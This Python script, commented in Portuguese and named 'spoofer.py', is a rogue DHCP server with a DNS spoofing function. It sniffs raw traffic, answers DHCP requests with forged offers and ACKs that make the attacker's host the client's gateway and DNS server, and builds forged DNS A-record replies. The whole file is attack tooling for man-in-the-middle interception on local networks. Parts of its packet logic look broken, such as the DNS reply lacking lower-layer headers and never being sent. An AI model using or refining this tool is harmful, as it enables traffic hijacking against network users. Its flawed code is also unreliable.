import socket
import struct
import fcntl
import array

# Definição dos tamanhos dos buffers de leitura e escrita
READ_BUFFSIZE = 1518
SEND_BUFFSIZE = 1024
ETHER_TYPE_IPv4 = 0x0800
DHCP_OFFER = 2
DHCP_ACK = 5

# Constantes auxiliares para ioctl
SIOCGIFADDR = 0x8915
SIOCGIFHWADDR = 0x8927
SIOCGIFFLAGS = 0x8913
SIOCSIFFLAGS = 0x8914
SIOCGIFINDEX = 0x8933
IFF_PROMISC = 0x100
ETH_P_ALL = 0x0003

# Função para calcular o checksum de um pacote
def in_cksum(packet):
    if len(packet) % 2 == 1:
        packet += b'\0'
    s = sum(array.array('H', packet))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s & 0xffff
    return s

class DHCPServer:
    def __init__(self, interface_name, ip_for_spoof):
        self.interface_name = interface_name
        self.ip_for_spoof = ip_for_spoof

        self.read_buffer = bytearray(READ_BUFFSIZE)
        self.write_buffer = bytearray(SEND_BUFFSIZE)

        # Cria um socket raw para capturar todos os pacotes na interface especificada
        self.read_sockfd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        self.read_sockfd.bind((self.interface_name, 0))
        self.read_sockfd.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, READ_BUFFSIZE)
        self.read_sockfd.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SEND_BUFFSIZE)

        # Obtém o endereço MAC e IP da interface
        self.mac_address = self.get_mac_address()
        self.ip_int, self.ip_str = self.get_ip_address()
        self.ifindex = self.get_interface_index()

    # Método para obter o endereço MAC da interface
    def get_mac_address(self):
        ifr = struct.pack('256s', self.interface_name[:15].encode('utf-8'))
        try:
            res = fcntl.ioctl(self.read_sockfd.fileno(), SIOCGIFHWADDR, ifr)
            mac = res[18:24]
        except Exception as e:
            raise Exception("Erro ao obter o endereço MAC: " + str(e))
        return mac

    # Método para obter o endereço IP da interface
    def get_ip_address(self):
        ifr = struct.pack('256s', self.interface_name[:15].encode('utf-8'))
        try:
            res = fcntl.ioctl(self.read_sockfd.fileno(), SIOCGIFADDR, ifr)
            ip = struct.unpack('!I', res[20:24])[0]
            ip_str = socket.inet_ntoa(res[20:24])
        except Exception as e:
            raise Exception("Erro ao obter o endereço IP: " + str(e))
        return ip, ip_str

    # Método para obter o índice da interface
    def get_interface_index(self):
        ifr = struct.pack('256s', self.interface_name[:15].encode('utf-8'))
        try:
            res = fcntl.ioctl(self.read_sockfd.fileno(), SIOCGIFINDEX, ifr)
            ifindex = struct.unpack('I', res[16:20])[0]
        except Exception as e:
            raise Exception("Erro ao obter o índice da interface: " + str(e))
        return ifindex

    # Método para capturar pacotes
    def sniff(self):
        while True:
            packet = self.read_sockfd.recv(READ_BUFFSIZE)
            ether_type = struct.unpack('!H', packet[12:14])[0]
            if ether_type == ETHER_TYPE_IPv4:
                ip_header = packet[14:34]
                dst_ip = socket.inet_ntoa(ip_header[16:20])
                if dst_ip != self.ip_for_spoof:
                    continue

                ip_protocol = struct.unpack('!B', ip_header[9:10])[0]
                if ip_protocol == 17:  # Protocolo UDP
                    udp_header = packet[34:42]
                    dest_port = struct.unpack('!H', udp_header[2:4])[0]
                    if dest_port == 67:  # Porta do servidor DHCP
                        self.log_dhcp_request(packet)
                        self.read_buffer[:] = packet  # Salva o pacote capturado
                        return packet
                    elif dest_port == 53:  # Porta DNS
                        self.log_dns_request(packet)
                        self.forge_dns_response(packet)
                        return packet

    # Método para construir uma oferta DHCP
    def build_dhcp_offer(self, client_mac, transaction_id):
        print("Construindo uma oferta DHCP!")
        self.write_buffer = bytearray(SEND_BUFFSIZE)

        # Ethernet header
        struct.pack_into('!6s6sH', self.write_buffer, 0, client_mac, self.mac_address, ETHER_TYPE_IPv4)

        # IP header
        src_ip = struct.unpack("!I", socket.inet_aton(self.ip_str))[0]
        dst_ip = struct.unpack("!I", socket.inet_aton(self.ip_for_spoof))[0]
        ip_header = struct.pack('!BBHHHBBHII',
                                0x45, 0, 336, 0, 0, 16, 17, 0, src_ip, dst_ip)
        checksum = in_cksum(ip_header)
        struct.pack_into('!BBHHHBBHII', self.write_buffer, 14, 0x45, 0, 336, 0, 0, 16, 17, checksum, src_ip, dst_ip)

        # UDP header
        udp_header = struct.pack('!HHHH', 67, 68, 0x13c, 0)
        self.write_buffer[34:42] = udp_header

        # DHCP header
        dhcp_header = struct.pack('!BBBBIHHIIII16s192s4s',
                                2, 1, 6, 0, transaction_id, 0, 0, 0, 0, dst_ip, 0,
                                client_mac, b'\x00' * 192, b'\x63\x82\x53\x63')
        self.write_buffer[42:282] = dhcp_header

        # DHCP options
        options = [
            (53, 1, [DHCP_OFFER]),
            (54, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (1, 4, [255, 255, 255, 0]),
            (51, 4, [0, 1, 56, 128]),
            (3, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (6, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (28, 4, [255, 255, 255, 255]),
            (255,)
        ]
        offset = 282
        for opt in options:
            self.write_buffer[offset] = opt[0]
            offset += 1
            if len(opt) > 1:
                self.write_buffer[offset] = opt[1]
                offset += 1
                for byte in opt[2]:
                    self.write_buffer[offset] = byte
                    offset += 1
        self.write_buffer[offset] = 0xff

        self.log_dhcp_response()

    # Método para enviar o buffer de escrita
    def send_write_buffer(self):
        to = (self.interface_name, self.ifindex)
        send_sockfd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        send_sockfd.bind(to)
        print("Enviando pacote DHCP...")
        send_sockfd.send(self.write_buffer)
        print("Pacote DHCP enviado.")
        send_sockfd.close()

    # Método para construir um ACK DHCP
    def build_dhcp_ack(self, client_mac, transaction_id):
        print("Construindo um ACK DHCP!")
        self.write_buffer = bytearray(SEND_BUFFSIZE)

        # Ethernet header
        struct.pack_into('!6s6sH', self.write_buffer, 0, client_mac, self.mac_address, ETHER_TYPE_IPv4)

        # IP header
        src_ip = struct.unpack("!I", socket.inet_aton(self.ip_str))[0]
        dst_ip = struct.unpack("!I", socket.inet_aton(self.ip_for_spoof))[0]
        ip_header = struct.pack('!BBHHHBBHII',
                                0x45, 0, 336, 0, 0, 16, 17, 0, src_ip, dst_ip)
        checksum = in_cksum(ip_header)
        struct.pack_into('!BBHHHBBHII', self.write_buffer, 14, 0x45, 0, 336, 0, 0, 16, 17, checksum, src_ip, dst_ip)

        # UDP header
        udp_header = struct.pack('!HHHH', 67, 68, 0x13c, 0)
        self.write_buffer[34:42] = udp_header

        # DHCP header
        dhcp_header = struct.pack('!BBBBIHHIIII16s192s4s',
                                5, 1, 6, 0, transaction_id, 0, 0, 0, 0, dst_ip, 0,
                                client_mac, b'\x00' * 192, b'\x63\x82\x53\x63')
        self.write_buffer[42:282] = dhcp_header

        # DHCP options
        options = [
            (53, 1, [DHCP_ACK]),
            (54, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (1, 4, [255, 255, 255, 0]),
            (51, 4, [0, 1, 56, 128]),
            (3, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (6, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
            (28, 4, [255, 255, 255, 255]),
            (255,)
        ]
        offset = 282
        for opt in options:
            self.write_buffer[offset] = opt[0]
            offset += 1
            if len(opt) > 1:
                self.write_buffer[offset] = opt[1]
                offset += 1
                for byte in opt[2]:
                    self.write_buffer[offset] = byte
                    offset += 1
        self.write_buffer[offset] = 0xff

        self.log_dhcp_response()

    # Método para registrar uma solicitação DHCP
    def log_dhcp_request(self, packet):
        print("Solicitação DHCP Recebida:")
        src_mac = ':'.join('%02x' % b for b in packet[6:12])
        dst_mac = ':'.join('%02x' % b for b in packet[0:6])
        src_ip = socket.inet_ntoa(packet[26:30])
        dst_ip = socket.inet_ntoa(packet[30:34])
        print(f"MAC de Origem: {src_mac}, MAC de Destino: {dst_mac}")
        print(f"IP de Origem: {src_ip}, IP de Destino: {dst_ip}")

    # Método para registrar uma resposta DHCP
    def log_dhcp_response(self):
        print("Resposta DHCP Enviada:")
        src_mac = ':'.join('%02x' % b for b in self.write_buffer[6:12])
        dst_mac = ':'.join('%02x' % b for b in self.write_buffer[0:6])
        src_ip = socket.inet_ntoa(self.write_buffer[26:30])
        dst_ip = socket.inet_ntoa(self.write_buffer[30:34])
        print(f"MAC de Origem: {src_mac}, MAC de Destino: {dst_mac}")
        print(f"IP de Origem: {src_ip}, IP de Destino: {dst_ip}")

    # Método para registrar uma solicitação DNS
    def log_dns_request(self, packet):
        print("Solicitação DNS Recebida:")
        src_mac = ':'.join('%02x' % b for b in packet[6:12])
        dst_mac = ':'.join('%02x' % b for b in packet[0:6])
        src_ip = socket.inet_ntoa(packet[26:30])
        dst_ip = socket.inet_ntoa(packet[30:34])
        print(f"MAC de Origem: {src_mac}, MAC de Destino: {dst_mac}")
        print(f"IP de Origem: {src_ip}, IP de Destino: {dst_ip}")

    # Método para registrar uma resposta DNS
    def log_dns_response(self):
        print("Resposta DNS Enviada:")
        src_mac = ':'.join('%02x' % b for b in self.write_buffer[6:12])
        dst_mac = ':'.join('%02x' % b for b in self.write_buffer[0:6])
        src_ip = socket.inet_ntoa(self.write_buffer[26:30])
        dst_ip = socket.inet_ntoa(self.write_buffer[30:34])
        print(f"MAC de Origem: {src_mac}, MAC de Destino: {dst_mac}")
        print(f"IP de Origem: {src_ip}, IP de Destino: {dst_ip}")

    # Método para forjar uma resposta DNS
    def forge_dns_response(self, request):
        print("Construindo uma resposta DNS forjada!")
        transaction_id = request[42:44]
        flags = b'\x81\x80'  # Resposta padrão, sem erro
        questions = request[44:46]
        answer_rrs = b'\x00\x01'  # Uma resposta
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        dns_header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs

        query_name = request[54:54+len(request[54:].split(b'\x00')[0])+1]
        query_type_class = request[54+len(query_name):54+len(query_name)+4]

        response_name = query_name
        response_type = b'\x00\x01'  # Tipo A
        response_class = b'\x00\x01'  # Classe IN
        ttl = b'\x00\x00\x00\x3c'  # TTL 60 segundos
        data_length = b'\x00\x04'  # Comprimento do endereço IP
        response_ip = socket.inet_aton(self.ip_for_spoof)

        response = dns_header + query_name + query_type_class + response_name + response_type + response_class + ttl + data_length + response_ip
        self.write_buffer[:len(response)] = response
        self.log_dns_response()

    # Método principal para executar o servidor DHCP
    def run(self):
        print("Iniciando servidor DHCP...")
        packet = self.sniff()
        client_mac = packet[6:12]
        transaction_id = struct.unpack('!I', packet[42:46])[0]
        # O IP oferecido ao cliente será o IP de spoofing
        self.build_dhcp_offer(client_mac, transaction_id)
        self.send_write_buffer()
        packet = self.sniff()
        client_mac = packet[6:12]
        transaction_id = struct.unpack('!I', packet[42:46])[0]
        self.build_dhcp_ack(client_mac, transaction_id)
        self.send_write_buffer()
        print("Servidor DHCP finalizado.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Uso: sudo python3 spoofer.py <interface_name> <ip_for_spoof>")
        sys.exit(1)

    # Cria uma instância do servidor DHCP e executa
    server = DHCPServer(sys.argv[1], sys.argv[2])
    server.run()
